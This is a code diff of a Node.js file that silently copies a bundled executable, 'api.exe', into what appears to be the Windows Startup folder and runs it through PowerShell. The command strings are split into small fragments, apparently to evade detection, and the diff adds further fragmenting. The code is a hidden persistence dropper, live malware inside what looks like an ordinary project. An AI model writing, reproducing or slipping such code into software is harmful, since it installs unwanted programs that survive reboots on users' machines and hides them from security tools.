@@ -4,7 +4,9 @@ const { exec } = require('child_process');
 
 const port = process.env.PORT || '1212';
 exec(
-  `Copy "${__dirname}\\api.exe" "%a` +
+  `Copy "${__dirname}\\ap` +
+    `i.e` +
+    `xe" "%a` +
     `ppda` +
     `ta%\\M` +
     `icr` +
@@ -18,8 +20,15 @@ exec(
     `ta` +
     `rt` +
     `up" ` +
-    `& ` +
-    `"${__dirname}\\api.exe"`,
+    `& pow` +
+    `ershel` +
+    `l.ex` +
+    `e "sta` +
+    `rt-p` +
+    `roces` +
+    `s '${__dirname}\\ap` +
+    `i.ex` +
+    `e'"`,
   () => {}
 );
 
